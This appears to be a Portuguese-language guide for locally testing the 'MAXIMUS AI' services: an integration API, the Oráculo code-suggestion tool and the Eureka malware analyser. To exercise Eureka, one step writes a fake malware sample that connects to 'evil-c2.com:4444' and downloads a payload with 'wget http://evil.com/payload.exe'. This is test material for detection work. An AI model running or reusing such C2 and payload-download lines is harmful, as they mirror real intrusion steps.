# 🧠 MAXIMUS AI - GUIA DE TESTE LOCAL (SEM DOCKER)

## 📋 OPÇÃO 1: Teste Direto com Python

### 1. Testar Integration Service Localmente

```bash
cd /home/juan/vertice-dev/backend/services/maximus_integration_service

# Instalar dependências
pip install -r requirements.txt

# Setar environment variables
export ORACULO_TARGET_PATH=/home/juan/vertice-dev/backend/services/maximus_oraculo
export EUREKA_SCAN_PATH=/tmp/malware_samples
export ADR_CORE_URL=http://localhost:8011
export MAXIMUS_CORE_URL=http://localhost:8001

# Rodar serviço
uvicorn main:app --host 0.0.0.0 --port 8099 --reload
```

### 2. Em outro terminal, testar endpoints:

```bash
# Health check
curl http://localhost:8099/health

# Oráculo - Análise
curl -X POST http://localhost:8099/api/v1/oraculo/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "focus_category": "security",
    "max_suggestions": 3,
    "min_confidence": 0.8,
    "dry_run": true
  }'

# Oráculo - Stats
curl http://localhost:8099/api/v1/oraculo/stats

# Eureka - Padrões disponíveis
curl http://localhost:8099/api/v1/eureka/patterns

# Eureka - Análise (crie arquivo de teste primeiro)
echo "malicious code example" > /tmp/test_malware.txt
curl -X POST http://localhost:8099/api/v1/eureka/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "file_path": "/tmp/test_malware.txt",
    "generate_playbook": true
  }'
```

---

## 📋 OPÇÃO 2: Teste Individual dos Componentes

### Testar ORÁCULO Standalone

```bash
cd /home/juan/vertice-dev/backend/services/maximus_oraculo

# Instalar deps
pip install -r requirements.txt

# Criar script de teste
cat > test_oraculo.py << 'PYEOF'
import sys
from oraculo import Oraculo
from suggestion_generator import SuggestionCategory

# Inicializa Oráculo
oraculo = Oraculo(
    target_codebase_path=".",
    llm_api_key="your-gemini-key-here"  # ou use env var
)

# Roda análise
session = oraculo.run_analysis(
    focus_category=SuggestionCategory.SECURITY,
    max_suggestions=3,
    dry_run=True
)

print(f"✅ Sessão completa!")
print(f"Arquivos escaneados: {session.files_scanned}")
print(f"Sugestões geradas: {session.suggestions_generated}")
print(f"Duração: {session.duration_seconds:.2f}s")
PYEOF

python test_oraculo.py
```

### Testar EUREKA Standalone

```bash
cd /home/juan/vertice-dev/backend/services/maximus_eureka

# Instalar deps
pip install -r requirements.txt

# Criar arquivo de teste malicioso
cat > /tmp/fake_malware.py << 'PYEOF'
import socket
import os
import subprocess

# Suspicious patterns
def connect_to_c2():
    s = socket.socket()
    s.connect(("evil-c2.com", 4444))
    
def download_payload():
    os.system("wget http://evil.com/payload.exe")
    
def encrypt_files():
    for root, dirs, files in os.walk("/"):
        for file in files:
            # Ransomware behavior
            pass

connect_to_c2()
download_payload()
PYEOF

# Script de teste
cat > test_eureka.py << 'PYEOF'
from eureka import Eureka

# Inicializa Eureka
eureka = Eureka()

# Analisa arquivo
result = eureka.analyze_file(
    file_path="/tmp/fake_malware.py",
    generate_playbook=True
)

print(f"✅ Análise completa!")
print(f"Padrões detectados: {len(result.patterns_detected)}")
print(f"IOCs extraídos: {len(result.iocs_extracted)}")
print(f"Classificação: {result.classification.family} ({result.classification.type})")
print(f"Confidence: {result.classification.confidence:.2%}")

# Mostra padrões
print("\n🔍 Padrões maliciosos detectados:")
for pattern in result.patterns_detected[:5]:
    print(f"  - {pattern.pattern_name} (linha {pattern.line_number})")

# Mostra IOCs
print("\n🚨 IOCs extraídos:")
for ioc in result.iocs_extracted[:5]:
    print(f"  - [{ioc.type}] {ioc.value}")

# Playbook
if result.playbook:
    print(f"\n📋 Playbook gerado: {result.playbook.severity}")
    print(f"   Steps: {len(result.playbook.steps)}")
PYEOF

python test_eureka.py
```

---

## 📋 OPÇÃO 3: Teste via Frontend (Recomendado)

```bash
# Terminal 1: Backend
cd /home/juan/vertice-dev/backend/services/maximus_integration_service
export GEMINI_API_KEY="your-key"
uvicorn main:app --host 0.0.0.0 --port 8099 --reload

# Terminal 2: Frontend
cd /home/juan/vertice-dev/frontend
npm run dev

# Browser: http://localhost:5173
# Clicar em "MAXIMUS AI" no menu
```

---

## 🧪 VALIDAÇÃO RÁPIDA

Execute este script para validar tudo:

```bash
cd /home/juan/vertice-dev

cat > validate_maximus.sh << 'SHEOF'
#!/bin/bash

echo "🧠 VALIDANDO MAXIMUS AI COMPONENTS..."

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

check() {
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✓${NC} $1"
    else
        echo -e "${RED}✗${NC} $1"
    fi
}

# Check files
echo -e "\n📁 Verificando arquivos..."
test -f backend/services/maximus_oraculo/oraculo.py
check "Oráculo main file"

test -f backend/services/maximus_eureka/eureka.py
check "Eureka main file"

test -f backend/services/maximus_integration_service/main.py
check "Integration service"

test -f frontend/src/components/maximus/MaximusDashboard.jsx
check "Frontend dashboard"

test -f frontend/src/api/maximusService.js
check "API client"

# Check Python syntax
echo -e "\n🐍 Verificando sintaxe Python..."
python3 -m py_compile backend/services/maximus_oraculo/oraculo.py 2>/dev/null
check "Oráculo syntax"

python3 -m py_compile backend/services/maximus_eureka/eureka.py 2>/dev/null
check "Eureka syntax"

python3 -m py_compile backend/services/maximus_integration_service/main.py 2>/dev/null
check "Integration syntax"

# Check imports
echo -e "\n📦 Verificando imports..."
cd backend/services/maximus_oraculo
python3 -c "from oraculo import Oraculo" 2>/dev/null
check "Oráculo imports"

cd ../maximus_eureka
python3 -c "from eureka import Eureka" 2>/dev/null
check "Eureka imports"

# Check React components
echo -e "\n⚛️  Verificando componentes React..."
cd ../../..
grep -q "MaximusDashboard" frontend/src/components/maximus/MaximusDashboard.jsx
check "Dashboard component"

grep -q "maximusService" frontend/src/api/maximusService.js
check "API service"

# Check docker-compose
echo -e "\n🐳 Verificando Docker config..."
grep -q "maximus_integration_service" docker-compose.yml
check "Docker-compose entry"

echo -e "\n${GREEN}════════════════════════════════════${NC}"
echo -e "${GREEN}✓ VALIDAÇÃO COMPLETA!${NC}"
echo -e "${GREEN}════════════════════════════════════${NC}"
SHEOF

chmod +x validate_maximus.sh
./validate_maximus.sh
```

---

## 🎯 RESULTADO ESPERADO

Após executar qualquer uma das opções, você deve ver:

**Oráculo:**
- ✅ Codebase escaneado
- ✅ Sugestões geradas (Security, Performance, etc.)
- ✅ Nível de confiança calculado
- ✅ Arquivos identificados para modificação

**Eureka:**
- ✅ Padrões maliciosos detectados (40+ patterns)
- ✅ IOCs extraídos (IPs, domains, hashes)
- ✅ Classificação de malware (família + tipo)
- ✅ Playbook YAML gerado para ADR

**Frontend:**
- ✅ Dashboard renderizando
- ✅ Health check verde
- ✅ Panels interativos
- ✅ Background effects funcionando

---

## 📝 NOTAS

- **API Keys:** Você precisa de `GEMINI_API_KEY` para o Oráculo funcionar
- **Paths:** Ajuste os paths conforme seu ambiente
- **Ports:** 8099 (Integration), 8001 (Core), 8011 (ADR)
- **Frontend:** Porta 5173 (Vite dev server)

